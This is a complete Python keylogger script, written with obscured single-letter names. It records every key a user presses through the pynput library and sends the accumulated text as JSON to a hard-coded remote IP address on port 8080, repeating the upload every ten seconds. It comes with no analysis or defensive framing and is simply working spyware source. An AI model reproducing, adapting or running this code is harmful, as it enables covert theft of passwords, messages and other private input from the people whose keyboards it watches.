#!/usr/bin/env python

C=''
from pynput import keyboard as A
import requests as D,json,threading as F
B=C
G='109.74.200.23'
H='8080'
I=10
def E():
	try:A=json.dumps({'keyboardData':B});C=f"http://{G}:{H}";J={'Content-Type':'application/json'};D.post(C,data=A,headers=J);K=F.Timer(I,E);K.start()
	except Exception as L:print(f"Couldn't complete request: {L}")
def J(key):
	D=key;global B;F={A.Key.enter:'\n',A.Key.tab:'\t',A.Key.space:' ',A.Key.shift:C,A.Key.backspace:C if len(B)==0 else B[:-1],A.Key.ctrl_l:C,A.Key.ctrl_r:C,A.Key.esc:False}
	if D in F:G=F[D]
	else:G=str(D).strip("'")
	B+=G;E();return D!=A.Key.esc
with A.Listener(on_press=J)as K:E();K.join()
